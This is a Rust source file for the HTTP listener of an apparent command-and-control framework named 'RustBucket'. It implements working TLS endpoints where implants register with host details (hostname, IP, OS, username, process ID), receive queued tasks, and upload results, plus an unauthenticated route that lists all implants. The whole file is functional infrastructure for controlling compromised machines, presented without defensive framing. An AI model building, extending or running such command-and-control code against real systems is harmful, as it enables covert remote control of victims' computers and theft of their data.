use actix_web::{web, App, HttpResponse, HttpServer, Responder};
use std::net::SocketAddr;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::SystemTime;
use tokio::sync::oneshot;
use tokio::task::JoinHandle;
use uuid::Uuid;

use crate::message::*;
use crate::store::Store;
use crate::task::*;

pub struct HttpListener {
    name: String,
    id: Uuid,
    addr: SocketAddr,
    store: Arc<dyn Store>,
    tls: Arc<rustls::ServerConfig>,
    running: Arc<AtomicBool>,
    shutdown_tx: Option<oneshot::Sender<()>>,
    handle: Option<JoinHandle<()>>,
}

impl HttpListener {
    pub fn new(
        name: &str,
        addr: SocketAddr,
        store: Arc<dyn Store>,
        tls: Arc<rustls::ServerConfig>,
    ) -> Self {
        Self::with_id(Uuid::new_v4(), name, addr, store, tls)
    }

    /// Restore a listener with a known ID. Used when rebuilding persisted listeners on startup.
    pub fn with_id(
        id: Uuid,
        name: &str,
        addr: SocketAddr,
        store: Arc<dyn Store>,
        tls: Arc<rustls::ServerConfig>,
    ) -> Self {
        HttpListener {
            name: name.to_string(),
            id,
            addr,
            store,
            tls,
            running: Arc::new(AtomicBool::new(false)),
            shutdown_tx: None,
            handle: None,
        }
    }

    pub fn addr(&self) -> SocketAddr {
        self.addr
    }

    pub fn name(&self) -> &str {
        &self.name
    }

    pub fn id(&self) -> Uuid {
        self.id
    }

    pub fn start(&mut self) -> Result<(), String> {
        // Don't start if already running
        if self.running.load(Ordering::SeqCst) {
            return Err("Listener is already running".to_string());
        }

        let server_addr = self.addr;
        let listener_name = self.name.clone();
        let listener_id = self.id;
        let tls = self.tls.clone();

        let listener_data = web::Data::new(ListenerData {
            name: listener_name.clone(),
            id: listener_id,
            store: self.store.clone(),
        });

        // Bind the socket synchronously so bind errors are reported to the caller instead of
        // being lost inside the spawned task. The HttpServer itself is not Send, so it is built
        // inside the task from this listener.
        let std_listener = std::net::TcpListener::bind(server_addr)
            .map_err(|e| format!("Failed to bind listener to {}: {}", server_addr, e))?;
        std_listener
            .set_nonblocking(true)
            .map_err(|e| format!("Failed to configure listener socket: {}", e))?;

        let (shutdown_tx, shutdown_rx) = oneshot::channel();
        self.shutdown_tx = Some(shutdown_tx);

        let running = self.running.clone();
        running.store(true, Ordering::SeqCst);

        // Run the server on the current runtime and stop it gracefully on shutdown.
        let handle = tokio::spawn(async move {
            let server = match HttpServer::new(move || {
                App::new()
                    .app_data(listener_data.clone())
                    .route("/", web::get().to(index))
                    .route("/checkin", web::post().to(implant_checkin))
                    .route("/tasks/{implant_id}", web::get().to(get_tasks))
                    .route("/results", web::post().to(upload_results))
                    .route("/implants", web::get().to(list_implants))
            })
            .listen_rustls_0_23(std_listener, (*tls).clone())
            {
                Ok(server) => server,
                Err(e) => {
                    log::error!("Failed to start listener on {}: {}", server_addr, e);
                    running.store(false, Ordering::SeqCst);
                    return;
                }
            };

            let server_future = server.run();
            let server_handle = server_future.handle();

            // Run the server in its own task so we can stop it via its handle without dropping the
            // future first (dropping it would cancel the command loop that processes the stop).
            let server_task = tokio::spawn(server_future);

            let _ = shutdown_rx.await;
            log::info!("Shutdown signal received for listener '{}'", listener_name);
            server_handle.stop(true).await;
            let _ = server_task.await;

            // Clean up
            running.store(false, Ordering::SeqCst);
            log::info!(
                "HTTP listener '{}' ({}) stopped",
                listener_name,
                listener_id
            );
        });

        self.handle = Some(handle);
        Ok(())
    }

    pub async fn stop(&mut self) -> Result<(), String> {
        if !self.running.load(Ordering::SeqCst) {
            return Err("Listener is not running".to_string());
        }

        // Send shutdown signal
        if let Some(tx) = self.shutdown_tx.take() {
            let _ = tx.send(());
        }

        // Wait for the task to complete
        if let Some(handle) = self.handle.take() {
            match handle.await {
                Ok(_) => {}
                Err(e) => return Err(format!("Error joining task: {}", e)),
            }
        }

        self.running.store(false, Ordering::SeqCst);
        Ok(())
    }

    /// Request the listener to stop without awaiting it.
    ///
    /// Dropping the shutdown sender resolves the receiver in the accept task, which gracefully
    /// stops the actix server and clears the running flag.
    pub fn request_stop(&mut self) {
        self.shutdown_tx.take();
    }

    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

async fn index(data: web::Data<ListenerData>) -> impl Responder {
    HttpResponse::Ok().body(format!("RustBucket Listener: {} ({})", data.name, data.id))
}

// implant registration/check-in endpoint
async fn implant_checkin(
    checkin: web::Json<ImplantCheckin>,
    data: web::Data<ListenerData>,
) -> impl Responder {
    let now = SystemTime::now();

    let implant_id = match checkin.id {
        // Existing implant - refresh its record.
        Some(id) if data.store.get_implant(&id).is_some() => {
            if let Some(mut implant) = data.store.get_implant(&id) {
                implant.hostname = checkin.hostname.clone();
                implant.ip_address = checkin.ip_address.clone();
                implant.os_info = checkin.os_info.clone();
                implant.username = checkin.username.clone();
                implant.process_id = checkin.process_id;
                implant.last_seen = now;
                if let Err(e) = data.store.upsert_implant(implant) {
                    log::error!("Failed to update implant {}: {}", id, e);
                    return HttpResponse::InternalServerError().body("failed to store implant");
                }
            }
            id
        }
        // New implant - register it and open a session.
        _ => {
            let new_id = Uuid::new_v4();
            let implant_info = ImplantInfo {
                id: new_id,
                hostname: checkin.hostname.clone(),
                ip_address: checkin.ip_address.clone(),
                os_info: checkin.os_info.clone(),
                username: checkin.username.clone(),
                process_id: checkin.process_id,
                first_seen: now,
                last_seen: now,
            };
            if let Err(e) = data.store.upsert_implant(implant_info) {
                log::error!("Failed to store implant {}: {}", new_id, e);
                return HttpResponse::InternalServerError().body("failed to store implant");
            }
            if let Err(e) = data.store.create_session(
                new_id,
                checkin.hostname.to_string(),
                checkin.ip_address.to_string(),
            ) {
                log::error!("Failed to create session for {}: {}", new_id, e);
                return HttpResponse::InternalServerError().body("failed to create session");
            }
            new_id
        }
    };

    log::info!("implant check-in: {}", implant_id);

    HttpResponse::Ok().json(serde_json::json!({
        "status": "success",
        "implant_id": implant_id,
    }))
}

// Get tasks for a specific implant
async fn get_tasks(path: web::Path<String>, data: web::Data<ListenerData>) -> impl Responder {
    let implant_id = match Uuid::parse_str(&path.into_inner()) {
        Ok(id) => id,
        Err(_) => return HttpResponse::BadRequest().body("Invalid implant ID"),
    };

    if data.store.get_implant(&implant_id).is_none() {
        return HttpResponse::NotFound().body("implant not found");
    }
    if let Err(e) = data.store.touch_implant(&implant_id) {
        log::error!("Failed to touch implant {}: {}", implant_id, e);
    }

    let session_id = match data.store.session_id_for_implant(&implant_id) {
        Some(id) => id,
        None => return HttpResponse::NotFound().body("No session found for implant"),
    };

    // The implant is alive, so (re)mark its session active. This also restores sessions that were
    // marked disconnected when the server restarted.
    if let Err(e) = data.store.activate_session(&session_id) {
        log::error!("Failed to activate session {}: {}", session_id, e);
    }

    // Get pending tasks and mark them as in progress
    let pending_tasks = data.store.list_pending_tasks(session_id);

    for task in &pending_tasks {
        if let Err(e) = data.store.set_task_status(&task.id, TaskStatus::InProgress) {
            log::error!("Error updating task status: {}", e);
            return HttpResponse::InternalServerError().body("Error updating task status");
        }
    }

    HttpResponse::Ok().json(pending_tasks)
}

// Upload task results
async fn upload_results(
    result: web::Json<TaskResult>,
    data: web::Data<ListenerData>,
) -> impl Responder {
    let task_result = result.into_inner();

    if data.store.get_session(&task_result.session_id).is_none() {
        return HttpResponse::NotFound().body("Session not found");
    }

    match data.store.submit_result(task_result) {
        Ok(_) => HttpResponse::Ok().json(serde_json::json!({
            "status": "success",
            "message": "Task result received"
        })),
        Err(e) => HttpResponse::BadRequest().body(e.to_string()),
    }
}

// List all active implants
async fn list_implants(data: web::Data<ListenerData>) -> impl Responder {
    HttpResponse::Ok().json(data.store.list_implants())
}

// Shared data structure for route handlers
struct ListenerData {
    name: String,
    id: Uuid,
    store: Arc<dyn Store>,
}
